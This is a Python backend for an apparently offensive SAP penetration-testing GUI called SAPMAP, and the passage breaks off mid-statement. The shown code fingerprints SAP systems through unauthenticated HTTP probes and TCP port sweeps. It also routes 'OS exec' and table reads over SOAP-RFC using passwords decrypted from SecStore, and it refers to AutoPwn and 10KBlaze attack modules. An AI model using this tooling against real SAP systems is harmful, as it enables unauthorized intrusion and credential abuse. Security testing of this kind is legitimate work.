#!/usr/bin/env python3
"""
SAPMAP GUI Backend — Bottle HTTP server providing REST API for the frontend.

Mirrors the SAPology_gui.py architecture: Bottle + pywebview (or browser).
All operations run in background threads; JS polls for state updates.
"""

import io
import json
import os
import sys
import threading
import time
from datetime import datetime

from bottle import Bottle, BaseRequest, request, response, static_file

BaseRequest.MEMFILE_MAX = 512 * 1024 * 1024

from sapmap_models import (SAPMAPState, SAPNode, InstanceInfo, RFCConnection,
                           Credentials, CreatedUser, Finding, Severity)
from sapmap_findings import emit_finding
from sapmap_html import get_html
import sapmap_scanner
import sapmap_rfc
import sapmap_exploit
import sapmap_cleanup
import sapmap_secstore
import sapmap_state as state_mgr
import sapmap_findings

_http_sid_cache: dict = {}


def _probe_sap_base(base_url: str) -> dict:
    """Probe a single base URL (host:port) for SAP system info.

    Hits three ICM endpoints in parallel with short timeouts:
    1. /sap/public/info          — SOAP RFC_SYSTEM_INFO (richest)
    2. /sap/                     — ICF 404 error page
    3. /sap/bc/gui/sap/its/webgui — logon form (SID only)
    """
    import re
    import ssl
    import threading as _t
    import urllib.request
    import urllib.error

    base = base_url.rstrip("/")
    info = {"sid": "", "instance_nr": "", "hostname": "", "ip": ""}
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    def _get(path, max_bytes=16384, timeout=3):
        req = urllib.request.Request(f"{base}{path}", method="GET")
        req.add_header("User-Agent", "SAPMAP/1.0")
        try:
            with urllib.request.urlopen(
                    req, timeout=timeout, context=ctx) as r:
                return r.read(max_bytes).decode(
                    "utf-8", errors="replace"), ""
        except urllib.error.HTTPError as he:
            try:
                return he.read(max_bytes).decode(
                    "utf-8", errors="replace"), ""
            except Exception as e:
                return "", f"{type(e).__name__}: {e}"
        except Exception as e:
            return "", f"{type(e).__name__}: {e}"

    results = {}

    def _probe_public_info():
        body, err = _get("/sap/public/info")
        results["public_info"] = (body, err)

    def _probe_root():
        body, err = _get("/sap/")
        results["root"] = (body, err)

    def _probe_webgui():
        body, err = _get(
            "/sap/bc/gui/sap/its/webgui", max_bytes=65536)
        results["webgui"] = (body, err)

    threads = [
        _t.Thread(target=_probe_public_info, daemon=True),
        _t.Thread(target=_probe_root, daemon=True),
        _t.Thread(target=_probe_webgui, daemon=True),
    ]
    for th in threads:
        th.start()
    for th in threads:
        th.join(timeout=4)

    body, err = results.get("public_info", ("", "no result"))
    if body:
        m = re.search(r'<RFCSYSID>(\w{3})</RFCSYSID>', body)
        if not m:
            m = re.search(r'<SAPSID>(\w{3})</SAPSID>', body)
        if m:
            info["sid"] = m.group(1)
        m = re.search(r'<RFCDEST>[^<]*_(\d{2})</RFCDEST>', body)
        if m:
            info["instance_nr"] = m.group(1)
        m = re.search(r'<RFCHOST2?>([^<]+)</RFCHOST2?>', body)
        if m:
            info["hostname"] = m.group(1).strip()
        m = re.search(r'<RFCIPV6ADDR>([^<]+)</RFCIPV6ADDR>', body)
        if not m:
            m = re.search(r'<RFCIPADDR>([^<]+)</RFCIPADDR>', body)
        if m:
            info["ip"] = m.group(1).strip()

    if not info["sid"] or not info["instance_nr"]:
        body, _ = results.get("root", ("", ""))
        if body:
            if not info["sid"]:
                m = re.search(r'in system\s+(\w{3})\s', body)
                if m:
                    info["sid"] = m.group(1).strip()
            m = re.search(
                r'Error Code:.*?-i\w+_(\w{3})_(\d{2})', body)
            if m:
                if not info["sid"]:
                    info["sid"] = m.group(1)
                if not info["instance_nr"]:
                    info["instance_nr"] = m.group(2)

    if not info["sid"]:
        body, _ = results.get("webgui", ("", ""))
        if body:
            m = re.search(r'id="sysid"[^>]*value="(\w{3})"', body)
            if m:
                info["sid"] = m.group(1)

    info["_errs"] = {k: v[1] for k, v in results.items() if v[1]}
    return info


def _discover_sid_http(base_url: str,
                       extra_hint_ports: list = None) -> dict:
    """Discover SAP system info via unauthenticated HTTP probes.

    Returns dict with keys: sid, instance_nr, hostname, ip.
    All values default to "" when not discovered.

    First probes the URL as given.  If that doesn't yield results
    (e.g. because the RFCDES parser stripped a default :80 / :443
    port, but ICM actually listens on 8xxx), retries against common
    SAP ICM ports (8000-8050, 8400-8450, 50000-50020).

    Results are cached per base URL so sibling destinations don't
    re-probe.
    """
    from urllib.parse import urlparse as _up

    base = base_url.rstrip("/")
    cache_key = base.lower()
    cached = _http_sid_cache.get(cache_key)
    if cached is not None:
        return dict(cached)

    info = _probe_sap_base(base)

    if not info.get("sid") and not info.get("instance_nr"):
        try:
            p = _up(base)
            host = p.hostname or ""
            scheme = p.scheme or "http"
            tried_port = p.port or (443 if scheme == "https" else 80)
        except Exception:
            host, scheme, tried_port = "", "http", 0

        candidate_ports = list(range(8000, 8051)) + \
            list(range(8400, 8451)) + \
            list(range(50000, 50021))
        candidate_ports = [
            pp for pp in candidate_ports if pp != tried_port]
        if extra_hint_ports:
            candidate_ports = [
                pp for pp in extra_hint_ports
                if pp != tried_port] + candidate_ports

        if host:
            import socket as _sock
            import threading as _t2

            open_ports = []
            open_lock = _t2.Lock()

            def _tcp_probe(pp):
                s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
                s.settimeout(0.8)
                try:
                    s.connect((host, pp))
                    s.close()
                    with open_lock:
                        open_ports.append(pp)
                except Exception:
                    pass

            print(f"[*] HTTP probe: TCP-scanning {host} for "
                  f"ICM port (URL port {tried_port} silent)...")
            tcp_threads = []
            for pp in candidate_ports:
                th = _t2.Thread(
                    target=_tcp_probe, args=(pp,), daemon=True)
                th.start()
                tcp_threads.append(th)
                if len(tcp_threads) >= 32:
                    for t in tcp_threads:
                        t.join(timeout=1.2)
                    tcp_threads = []
            for t in tcp_threads:
                t.join(timeout=1.2)

            if open_ports:
                print(f"[*] HTTP probe: {len(open_ports)} open "
                      f"port(s) on {host}: {open_ports[:6]}"
                      f"{'...' if len(open_ports) > 6 else ''}")

            for pp in sorted(open_ports):
                sub_base = f"{scheme}://{host}:{pp}"
                sub = _probe_sap_base(sub_base)
                sub.pop("_errs", None)
                if sub.get("sid") or sub.get("instance_nr"):
                    info["sid"] = sub.get("sid", "") or info["sid"]
                    info["instance_nr"] = (
                        sub.get("instance_nr", "")
                        or info["instance_nr"])
                    info["hostname"] = (
                        sub.get("hostname", "") or info["hostname"])
                    info["ip"] = sub.get("ip", "") or info["ip"]
                    # Remember the working ICM port — callers (SOAP-RFC
                    # session, _correct_node_from_http) use it to skip
                    # repeating the sweep.
                    info["icm_port"] = pp
                    info["icm_scheme"] = scheme
                    print(f"[+] HTTP probe: SAP ICM on "
                          f"{host}:{pp}")
                    break

    # If the URL's own port already worked, also surface it so callers
    # can persist it on the node.
    if not info.get("icm_port") and (
            info.get("sid") or info.get("instance_nr")):
        try:
            p = _up(base)
            info["icm_port"] = p.port or (
                443 if (p.scheme or "http") == "https" else 80)
            info["icm_scheme"] = p.scheme or "http"
        except Exception:
            pass

    # Last resort — Host Agent SOAP probe on 1128/1129.
    # ``GetSystemInstanceList`` returns SID + instance for every SAP
    # system on the box.  1128/1129 is often the ONLY port a firewalled
    # RFC target exposes: dispatcher 32XX and gateway 33XX are blocked,
    # ICM 8XXX / 50XX aren't running, but the Host Agent stays reachable
    # because SolMan / LaMa / DBACockpit rely on it.  Without this probe
    # every such target ends up plotted with a placeholder SID derived
    # from its IP ("10_", "172", …) via _derive_sid.
    if not info.get("sid"):
        try:
            p = _up(base)
            _ha_host = p.hostname or ""
        except Exception:
            _ha_host = ""
        if _ha_host:
            try:
                from sapmap_scanner import query_host_agent_sid
                ha = query_host_agent_sid(_ha_host, timeout=2.5)
                if ha and ha.get("sid"):
                    info["sid"] = ha["sid"]
                    if ha.get("instance_nr") and not info.get(
                            "instance_nr"):
                        info["instance_nr"] = ha["instance_nr"]
                    # http_port from the Host Agent reply IS the ICM
                    # port for the running instance — much more accurate
                    # than a candidate-port sweep.
                    if ha.get("http_port") and not info.get(
                            "icm_port"):
                        info["icm_port"] = ha["http_port"]
                        info["icm_scheme"] = "http"
                    elif ha.get("https_port") and not info.get(
                            "icm_port"):
                        info["icm_port"] = ha["https_port"]
                        info["icm_scheme"] = "https"
            except Exception as _ha_err:
                # Non-fatal — Host Agent may be off, firewalled, or
                # hardened.  Falls through to _derive_sid downstream.
                print(f"[!] Host Agent probe on {_ha_host} "
                      f"failed: {_ha_err!s:.80}")

    errs = info.pop("_errs", {})
    if not info["sid"] and not info["instance_nr"] and errs:
        first_two = list(errs.items())[:2]
        print(f"[!] HTTP probe of {base} failed: "
              f"{'; '.join(f'{k}: {v}' for k, v in first_two)}")

    _http_sid_cache[cache_key] = dict(info)
    return info


def _derive_sid(destination_name: str, host: str) -> str:
    """Derive a SID from an RFC destination name or hostname.

    Unreliable heuristic — only used as a last resort for Type-3 RFC
    destinations when DEST_CHECK_CONNECTION didn't return a SID.
    HTTP destinations should use _discover_sid_http() instead.
    """
    import re
    name = destination_name.upper().strip()
    cleaned = re.sub(r'^(SAPMAP_|SAPHOUND_|SAP_|RFC_|SM_)', '', name)
    parts = re.split(r'[_\-]', cleaned)
    skip = {'TO', 'IN', 'OF', 'ON', 'AT', 'BY', 'CLNT', 'DEST',
            'CONN', 'TEST', 'PROD', 'DEV', 'QAS'}
    for p in parts:
        p = p.strip()
        if len(p) == 3 and p.isalnum() and not p.isdigit() and p not in skip:
            return p
    for p in parts:
        p = p.strip()
        if 2 <= len(p) <= 4 and p.isalnum() and not p.isdigit() and p not in skip:
            return p[:3]
    for p in parts:
        p = p.strip()
        if len(p) > 4:
            candidate = p[:3]
            if candidate.isalnum() and not candidate.isdigit():
                return candidate
    h = host.upper().replace('.', '_').replace('-', '_')
    parts = h.split('_')
    for p in parts:
        if 2 <= len(p) <= 4 and p.isalnum() and not p.isdigit():
            return p[:3]
    # Last-resort fallback: h[:3] returns numeric-only for IP-only
    # hosts ("10.10.1.4" -> "10_", "172.31.12.212" -> "172") which
    # then land on the map looking like real SIDs.  Return "UNK" for
    # anything digits-only; the caller's uniqueness counter turns
    # collisions into UNK, UNK1, UNK2, …
    fallback = h[:3] if len(h) >= 3 else "UNK"
    if all(c.isdigit() or c == '_' for c in fallback):
        return "UNK"
    return fallback


def _resolve_host(host: str) -> str:
    """Resolve a hostname to an IP address. Returns '' on failure."""
    import socket
    # If it already looks like an IP, return as-is
    try:
        socket.inet_aton(host)
        return host
    except socket.error:
        pass
    try:
        return socket.gethostbyname(host)
    except socket.gaierror:
        return ""


def _correct_node_from_http(target_node, http_info: dict):
    """Apply HTTP-probed instance_nr / ip / hostname to an existing node.

    Also records the discovered ICM port (and scheme) on the node's
    ports map so SOAP-RFC callers can find it later without re-running
    the port sweep.
    """
    if not http_info:
        return
    probed = http_info.get("instance_nr", "")
    if probed and target_node.instances:
        cur = target_node.instance_nrs()
        if cur and cur[0] != probed:
            old_i = cur[0]
            target_node.instances[0].instance_nr = probed
            old_p = dict(target_node.instances[0].ports)
            new_p = {}
            for p, lbl in old_p.items():
                if lbl == "dispatcher":
                    new_p[int(f"32{probed}")] = lbl
                elif lbl == "gateway":
                    new_p[int(f"33{probed}")] = lbl
                else:
                    new_p[p] = lbl
            target_node.instances[0].ports = new_p
            print(f"[*] {target_node.sid}: corrected "
                  f"instance {old_i}→{probed}")
    if http_info.get("ip") and not target_node.ip:
        target_node.ip = http_info["ip"]
    if http_info.get("hostname") and not target_node.hostname:
        target_node.hostname = http_info["hostname"]
    icm_port = http_info.get("icm_port")
    if icm_port and target_node.instances:
        scheme = http_info.get("icm_scheme", "http")
        label = "icm-https" if scheme == "https" else "icm-http"
        ports = target_node.instances[0].ports
        # Only add if no other port already has this label
        if not any(v == label for v in ports.values()):
            ports[int(icm_port)] = label
            print(f"[*] {target_node.sid}: recorded "
                  f"{label}={icm_port}")


def find_soap_rfc_route_for_node(state, target_node) -> dict:
    """Return a SOAPRFCSession-ready route to `target_node`, or None.

    Scans the state for any HTTP connection (Type-G/H) that:
      * targets this node (conn.target_sid == target_node.sid)
      * has been verified by Test Connection (soap_rfc_verified)
      * carries a SecStore-decrypted password (secstore_password)

    When found, resolves the actual ICM host:port via
    _resolve_soap_endpoint and returns:
      {
        "host": str, "port": int, "https": bool,
        "client": str, "user": str, "password": str,
        "via_destination": str,    # for log messages
      }

    Callers use this to dispatch OS exec, table reads, etc. through
    SOAP-RFC when the gateway port (33NN) is unreachable from the
    SAPMAP host.  Returns None when no viable route exists — caller
    should then fall back to pyrfc or the unauthenticated GW path.
    """
    if not target_node or not state:
        return None
    for conn in getattr(state, "connections", []):
        if conn.target_sid != target_node.sid:
            continue
        if (conn.conn_type or "").lower() != "http":
            continue
        # Accept the connection as a viable SOAP route if EITHER
        # Test Connection has explicitly verified SOAP-RFC works
        # (soap_rfc_verified) OR we've already exercised the chain
        # via successful user creation through it (has_sap_all +
        # logon_successful).  Without the second branch, state
        # saved from an older session that pre-dates the
        # _mark_connection_pwned soap_rfc_verified bump is invisible
        # to the route resolver — AutoPwn would then fall through
        # to pyrfc and hang on the firewalled gateway.
        proven_soap = (
            getattr(conn, "soap_rfc_verified", False)
            or (getattr(conn, "has_sap_all", False)
                and getattr(conn, "logon_successful", False))
        )
        if not proven_soap:
            continue
        if not (conn.rfc_user and conn.secstore_password):
            continue
        endpoint = _resolve_soap_endpoint(conn, target_node)
        if not endpoint.get("ok"):
            continue
        return {
            "host": endpoint["host"],
            "port": endpoint["port"],
            "https": endpoint["https"],
            "client": conn.client or "000",
            "user": conn.rfc_user,
            "password": conn.secstore_password,
            "via_destination": conn.destination_name,
        }
    return None


def _node_icm_endpoint(state, node):
    """Return (host, port, https) for the ICM HTTP endpoint we can use
    to talk SOAP-RFC to `node`, or None if undiscoverable.

    Prefers a verified-destination route (carries authoritative
    host/port from the previous probe).  Falls back to scanning the
    node's instance ports map for an icm-http(s) label.  Used by the
    operator-typed-credentials path (Test Connection on a username +
    password from the Add Credentials modal), where we want to verify
    the OPERATOR'S creds — not the saved destination's — over SOAP
    when the gateway is firewalled.
    """
    try:
        route = find_soap_rfc_route_for_node(state, node)
        if route:
            return route["host"], route["port"], route["https"]
    except Exception:
        pass
    if not node or not node.instances:
        return None
    host = node.ip or node.hostname
    if not host:
        return None
    for p, lbl in node.instances[0].ports.items():
        if lbl == "icm-http":
            return host, int(p), False
        if lbl == "icm-https":
            return host, int(p), True
    return None


def resolve_soap_session_for_node(state, node,
                                  timeout: float = 60.0):
    """Single source of truth for the SOAP-RFC-session resolution
    boilerplate.

    Returns ``(soap_session, soap_route)``.  Both are None UNLESS:
      * `find_soap_rfc_route_for_node` returns a viable route (Test-
        Connection-verified HTTP destination with SecStore password)
      * AND the target's gateway port (sapgw<NN>=33NN) is unreachable
        from this host (2s TCP probe via
        sapmap_exploit._gateway_port_reachable)

    Replaces the ~12-line route-resolve + gateway-probe + session-
    create block previously inlined at every SecStore / cleanup /
    propagate call site — five places when the refactor was done, and
    every future caller that picks up the same need.  Centralising it
    also makes it impossible to forget the gateway-probe step (which
    is what produces the desired "use pyrfc on healthy targets, SOAP
    only on firewalled ones" semantic).

    ``timeout`` propagates to the SOAPRFCSession's HTTP timeout — set
    high (180s) for ABAP_INSTALL_AND_RUN paths where the SAP kernel
    has to compile a program before executing it.  Default (60s) is
    fine for the BAPI / table-read paths.

    Any exception during resolution returns (None, None) silently —
    SOAP-RFC fallback is best-effort; callers must continue to work
    when the route can't be established, so failure to resolve is
    not itself a critical condition.
    """
    try:
        route = find_soap_rfc_route_for_node(state, node)
        if not route:
            return None, None
        from sapmap_exploit import _gateway_port_reachable
        if _gateway_port_reachable(node):
            return None, None
        from sap_soap_basic import SOAPRFCSession
        session = SOAPRFCSession(
            host=route["host"], port=route["port"],
            client=route["client"],
            user=route["user"],
            password=route["password"],
            https=route["https"],
            timeout=float(timeout),
        )
        return session, route
    except Exception:
        return None, None


def _resolve_soap_endpoint(conn, target_node) -> dict:
    """Pick a host/port/scheme tuple for SOAP-RFC against `target_node`.

    Priority (best signal first):
      1. target_node.instances[0].ports — if any port is labelled
         'icm-http' / 'icm-https', use that (set by a prior probe).
      2. conn.http_url — host + port from the destination's stored URL,
         when the port is not a stripped default (80 / 443).
      3. Probe target via _discover_sid_http to find a working port,
         caching the result on the node for the next call.

    Returns:
      {"host": str, "port": int, "https": bool, "ok": bool, "error": str}
      `ok` is False when none of the steps yielded a port.
    """
    out = {"host": "", "port": 0, "https": False,
           "ok": False, "error": ""}

    # Step 1: existing node ports labelled icm-http(s)
    if target_node and target_node.instances:
        for p, lbl in target_node.instances[0].ports.items():
            if lbl == "icm-http":
                out["host"] = (target_node.ip
                               or target_node.hostname or "")
                out["port"] = int(p)
                out["https"] = False
                out["ok"] = bool(out["host"])
                if out["ok"]:
                    return out
            if lbl == "icm-https":
                out["host"] = (target_node.ip
                               or target_node.hostname or "")
                out["port"] = int(p)
                out["https"] = True
                out["ok"] = bool(out["host"])
                if out["ok"]:
                    return out

    # Step 2: conn.http_url with non-default port
    http_url = getattr(conn, "http_url", "") or ""
    if http_url:
        try:
            from urllib.parse import urlparse as _up
            p = _up(http_url)
            host = p.hostname or ""
            scheme = p.scheme or "http"
            port = p.port
            if port and port not in (80, 443) and host:
                return {"host": host, "port": int(port),
                        "https": scheme == "https",
                        "ok": True, "error": ""}
        except Exception:
            pass

    # Step 3: probe (which TCP-scans candidate ports and caches result)
    if http_url:
        try:
            from urllib.parse import urlparse as _up
            p = _up(http_url)
            base = f"{p.scheme or 'http'}://{p.netloc}"
            info = _discover_sid_http(base)
            if info.get("icm_port"):
                # Persist on the node for next time
                if target_node:
                    _correct_node_from_http(target_node, info)
                return {"host": p.hostname or "",
                        "port": int(info["icm_port"]),
                        "https": (info.get("icm_scheme", "http")
                                  == "https"),
                        "ok": True, "error": ""}
        except Exception as e:
            out["error"] = f"probe failed: {e}"

    out["error"] = out["error"] or (
        "no ICM port resolvable from node ports or destination URL")
    return out


# ===========================================================================
# Console line buffer (same pattern as SAPology GUI)
# ===========================================================================

_console_lines = []
_console_lock = threading.Lock()

_ui_commands = []
_ui_cmd_lock = threading.Lock()


def ui_command(cmd: str, **kwargs):
    """Queue a command for the frontend to execute on its next poll."""
    with _ui_cmd_lock:
        _ui_commands.append({"cmd": cmd, **kwargs})


def _add_console_line(ts, text, css_class="cl-info"):
    with _console_lock:
        _console_lines.append({"ts": ts, "text": text, "cls": css_class})


# ---- Wire findings → console: every emit_finding() also shows up in the
# console pane with severity-specific styling, so nothing is ever hidden.
_SEV_TO_CSS = {
    "CRITICAL": "cl-crit",
    "HIGH":     "cl-warn",
    "MEDIUM":   "cl-warn",
    "INFO":     "cl-ok",
}


def _console_push_finding(record: dict) -> None:
    sev   = record.get("severity", "INFO")
    node  = record.get("node", "?")
    msg   = record.get("msg", "")
    cve   = record.get("cve", "")
    text  = f"[{sev}] {node} — {msg}"
    if cve:
        text += f"  ({cve})"
    escaped = (text
               .replace("&", "&amp;")
               .replace("<", "&lt;")
               .replace(">", "&gt;"))
    ts = datetime.now().strftime("%H:%M:%S")
    _add_console_line(ts, escaped, _SEV_TO_CSS.get(sev, "cl-info"))


sapmap_findings.register_listener(_console_push_finding)


class OutputCapture(io.TextIOBase):
    """Intercept stdout and push lines to the shared console buffer."""

    def __init__(self, original_stdout):
        self.original = original_stdout
        self.buffer = ""
        self.lock = threading.Lock()

    def write(self, text):
        if self.original:
            try:
                self.original.write(text)
            except Exception:
                pass

        with self.lock:
            self.buffer += text
            while "\r" in self.buffer and "\n" not in self.buffer:
                idx = self.buffer.rfind("\r")
                self.buffer = self.buffer[idx + 1:]
            while "\n" in self.buffer:
                line, self.buffer = self.buffer.split("\n", 1)
                line = line.rstrip("\r")
                if line.strip():
                    self._push_line(line)
        return len(text)

    def _push_line(self, line):
        css_class = "cl-info"
        if line.lstrip().startswith("[+]") or "detected" in line.lower():
            css_class = "cl-ok"
        elif line.lstrip().startswith("[-]") or "error" in line.lower():
            css_class = "cl-err"
        elif line.lstrip().startswith("[!]"):
            css_class = "cl-warn"
        elif line.lstrip().startswith("[*]"):
            css_class = "cl-info"
        elif "CRITICAL" in line or "SAP_ALL" in line:
            css_class = "cl-crit"
        elif line.lstrip().startswith("===") or line.lstrip().startswith("---"):
            css_class = "cl-dim"

        escaped = (line
                   .replace("&", "&amp;")
                   .replace("<", "&lt;")
                   .replace(">", "&gt;"))

        ts = datetime.now().strftime("%H:%M:%S")
        _add_console_line(ts, escaped, css_class)

    def flush(self):
        with self.lock:
            stripped = self.buffer.strip().rstrip("\r")
            if stripped:
                self._push_line(stripped)
                self.buffer = ""
        if self.original:
            try:
                self.original.flush()
            except Exception:
                pass

    def isatty(self):
        return False


# ===========================================================================
# Active-task tracker (thread-safe)
# ===========================================================================

_active_tasks = {}          # key → description, e.g. "NPL:rfc_system_info" → "RFC System Info"
_active_tasks_lock = threading.Lock()

# Stop-events for cancellable long-running operations (e.g. 10KBlaze betrusted,
# which can otherwise block for up to 25 minutes waiting for the MS propagation
# cycle).  The STOP button signals every event registered here.
_betrusted_stops = {}       # key → threading.Event
_betrusted_stops_lock = threading.Lock()


def _task_start(key: str, label: str = ""):
    with _active_tasks_lock:
        _active_tasks[key] = label or key


def _task_end(key: str):
    with _active_tasks_lock:
        _active_tasks.pop(key, None)


def _get_active_tasks() -> dict:
    with _active_tasks_lock:
        return dict(_active_tasks)


def _register_betrusted_stop(key: str, event: threading.Event):
    with _betrusted_stops_lock:
        _betrusted_stops[key] = event


def _unregister_betrusted_stop(key: str):
    with _betrusted_stops_lock:
        _betrusted_stops.pop(key, None)


def _signal_all_betrusted_stops() -> int:
    """Signal every registered betrusted stop_event. Returns count signalled."""
    with _betrusted_stops_lock:
        events = list(_betrusted_stops.items())
    for _, ev in events:
        try:
            ev.set()
        except Exception:
            pass
    return len(events)


def _bg(key: str, label: str, fn):
    """Launch *fn* in a daemon thread with task tracking.

    Each freshly-launched task implicitly clears the global stop
    flag so a prior STOP press doesn't silently cancel new work.
    Cancellation only affects work already in flight.
    """
    import sapmap_stop
    sapmap_stop.reset_stop()
    def _wrapper():
        _task_start(key, label)
        try:
            fn()
        finally:
            _task_end(key)
    threading.Thread(target=_wrapper, daemon=True).start()


def _set_wd_port_protocol(node, wd_port: int, https: bool) -> None:
    """Flip a WD port's service label between ``wd_http`` and ``wd_https``.

    Called when ``probe_wd_admin_credentials`` auto-resolves the
    protocol via fallback — the scanner's HTTPS heuristic only tags
    443 / 8443 / 44300 / 50001 as TLS, which misses operator-deployed
    TLS WDs on non-canonical ports (8011, 50301, etc.).  Once the
    probe figures out the actual protocol, persist it on the node so
    subsequent operations (Rediscover topology, ICMAD probes, icmauth
    extraction) hit the right scheme without re-discovering it.
    """
    new_label = "wd_https" if https else "wd_http"
    for inst in node.instances:
        if not inst.ports:
            continue
        if wd_port in inst.ports:
            inst.ports[wd_port] = new_label


def _enrich_wd_backends_from_admin_table(wd_node, systems: list,
                                            state=None) -> list:
    """Upgrade the WD's wd_backends list with real SID + MSHOST + MSPORT
    info from an authenticated wdisp/system_* readout, AND auto-create
    placeholder SAPNodes for each newly-revealed backend that isn't
    already on the map.

    Strategy:
      * For each parsed system, look for an existing wd_backends entry
        whose url_prefixes overlap with this system's SRCURL list.  If
        found, fill in the SID / MSHOST / MSPORT on that entry.
      * For each system with NO matching wd_backends entry, append a
        new entry derived purely from the admin readout.
      * For each admin-derived entry whose SID is now known: look for
        a SAPNode with that exact SID on the map; if missing, create
        a placeholder SAPNode using the REAL SID + MSHOST/MSPORT
        (vs. the Server-header bucket's synthetic B0B1-style SID).
        Auto-add it to state if a state container was supplied.
      * Always wire backend["linked_node_sid"] to whichever SAPNode
        (real or placeholder) corresponds to the backend.

    Returns the list of newly-created placeholder SAPNodes so the
    caller can ack them (the GUI handler logs them).

    The result: the WD's backend list goes from "1 bucket of all
    Java 7.50 prefixes" (Server-header bucketing) to "GSM at sapgsm:8121,
    J75 at 192.168.2.208:8101, JP1 at 10.10.1.31:8101" — and each
    becomes its own labelled node + edge on the map.
    """
    if not systems:
        return []
    existing = list(wd_node.wd_backends or [])

    def _srcurl_prefixes(srcurl_str: str) -> list:
        """SAP renders SRCURL as `/nwa/;/webdynpro/;/UserAdmin/...`"""
        if not srcurl_str or srcurl_str == "*":
            return []
        return [p.strip().rstrip("*").rstrip("/")
                for p in srcurl_str.split(";") if p.strip()]

    for sys_entry in systems:
        srcurl_prefixes = _srcurl_prefixes(sys_entry.get("srcurl", ""))
        sid_uc = (sys_entry.get("sid") or "").upper()
        mshost = sys_entry.get("mshost", "")
        msport = sys_entry.get("msport", 0)
        # Find an existing backend entry whose prefixes overlap with
        # this system's SRCURL (catch-all systems with empty SRCURL
        # fall through to the "create new" branch).
        target = None
        if srcurl_prefixes:
            for bk in existing:
                bk_prefixes = bk.get("url_prefixes") or []
                if any(any(bp.startswith(sp) or sp.startswith(bp)
                            for sp in srcurl_prefixes)
                          for bp in bk_prefixes):
                    target = bk
                    break
        if target is None:
            # Create a fresh entry for this backend
            target = {
                "signature": (f"wdisp/system_{sys_entry['system_index']} "
                               f"(SID={sid_uc or '?'})"),
                "server_header": "",
                "url_prefixes": srcurl_prefixes or ["<catch-all>"],
                "wd_version_hint": "",
                "likely_sid": sid_uc,
                "linked_node_sid": "",
                "is_suppressed": False,
            }
            existing.append(target)
        # Layer in the admin-derived fields
        target["wd_system_index"] = sys_entry["system_index"]
        target["wd_mshost"] = mshost
        target["wd_msport"] = msport
        target["wd_ssl_encrypt"] = sys_entry.get("ssl_encrypt", 0)
        target["wd_srcurl"] = sys_entry.get("srcurl", "")
        if sid_uc:
            target["likely_sid"] = sid_uc
            target["signature"] = (
                f"wdisp/system_{sys_entry['system_index']} "
                f"(SID={sid_uc}, MSHOST={mshost}:{msport})"
            )
    wd_node.wd_backends = existing
    print(f"[+] {wd_node.sid}: wd_backends enriched with admin-table "
          f"data — {len(systems)} system_* entry(ies) merged in")

    # Auto-create placeholder SAPNodes for newly-revealed backends
    # that aren't already on the map.  Uses the REAL SID we just
    # learned, MSHOST/MSPORT for the placeholder's hostname/instance,
    # and discovered_via_wd_sid to mark provenance.
    new_placeholders = []
    if state is None:
        # Caller didn't pass a state container — nothing to add to.
        return new_placeholders

    # Track which orphan-B placeholders this enrichment supersedes —
    # ones the WD previously had a backend pointing at, that now have
    # a real-SID placeholder to point at instead.  Pruned at the end.
    orphan_b_candidates = set()
    for bk in wd_node.wd_backends:
        sid_uc = (bk.get("likely_sid") or "").upper()
        mshost = bk.get("wd_mshost", "")
        msport = bk.get("wd_msport", 0)
        if not sid_uc:
            continue
        # Already linked to a real or placeholder node?
        if bk.get("linked_node_sid"):
            existing_linked = state.nodes.get(bk["linked_node_sid"])
            if existing_linked:
                # If the linked node is a synthetic B*-prefix
                # placeholder, mark it for orphan pruning now that
                # we have the real SID.  We unlink first; if no
                # other backend (on any WD) still references it,
                # it's deleted from state at the end.
                if (existing_linked.sid.startswith("B")
                        and existing_linked.sid != sid_uc
                        and getattr(existing_linked,
                                     "discovered_via_wd_sid", "")):
                    orphan_b_candidates.add(existing_linked.sid)
                    bk["linked_node_sid"] = ""    # break the link
                else:
                    continue
        # Is there already a node with this real SID?
        if sid_uc in state.nodes:
            bk["linked_node_sid"] = sid_uc
            continue
        # Create a placeholder with the real SID.  Deduce the SAP
        # instance number from the MS port using SAP's own formula:
        #   MSPORT 81NN → instance NN  (Java MS HTTP)
        #   MSPORT 36NN → instance NN  (ABAP MS internal)
        #   MSPORT 39NN → instance NN  (ABAP MS internal, exposed)
        from sapmap_models import SAPNode, InstanceInfo
        inst_nr = "??"
        for prefix in (8100, 3600, 3900):
            if prefix <= msport < prefix + 100:
                inst_nr = f"{msport - prefix:02d}"
                break
        # Stack-type heuristic: MSPORT 81NN → Java; 36NN/39NN → ABAP.
        # No reliable signal otherwise.
        stype = "SAP"
        if 8100 <= msport < 8200:
            stype = "JAVA"
        elif 3600 <= msport < 3700 or 3900 <= msport < 4000:
            stype = "ABAP"
        placeholder = SAPNode(
            sid=sid_uc,
            system_type=stype,
            hostname=mshost or "",
            ip="",                    # mshost may be DNS name, not IP
            instances=[],
        )
        placeholder.discovered_via_wd_sid = wd_node.sid
        # If MSPORT is known, capture it as an InstanceInfo so the
        # node has at least one port the operator can see / probe.
        # The dispatcher port (32NN) on the same instance is the
        # natural complementary fingerprint target.
        if msport:
            ports = {msport: "ms_server"}
            if inst_nr.isdigit():
                disp = 3200 + int(inst_nr)
                ports[disp] = "dispatcher"
            placeholder.instances.append(InstanceInfo(
                instance_nr=inst_nr,
                ip="",
                ports=ports,
            ))
        bk["linked_node_sid"] = sid_uc
        new_placeholders.append(placeholder)
        state.add_node(placeholder)

    # Orphan-prune: any B-prefix placeholder this WD no longer refers
    # to (and that no OTHER WD on the map references either) gets
    # deleted from state.  Keeps the map clean after the admin-table
    # upgrade.
    if orphan_b_candidates:
        # Build a set of every backend.linked_node_sid still in use
        # across every WD in the live state
        still_referenced = set()
        for n in state.nodes.values():
            for bk in (getattr(n, "wd_backends", []) or []):
                lsid = bk.get("linked_node_sid", "")
                if lsid:
                    still_referenced.add(lsid)
        for orphan_sid in orphan_b_candidates:
            if orphan_sid in still_referenced:
                continue   # another WD still uses this placeholder
            if orphan_sid in state.nodes:
                del state.nodes[orphan_sid]
                print(f"[-] {wd_node.sid}: removed orphan placeholder "
                      f"{orphan_sid} (superseded by real-SID "
                      f"placeholder from admin-table)")

    if new_placeholders:
        print(f"[+] {wd_node.sid}: promoted "
              f"{len(new_placeholders)} admin-discovered backend(s) "
              f"to placeholder node(s):")
        for p in new_placeholders:
            i = p.instances[0] if p.instances else None
            inst_hint = (f", inst {i.instance_nr}" if i and i.instance_nr
                          else "")
            print(f"      + {p.sid:8s} (type={p.system_type}, "
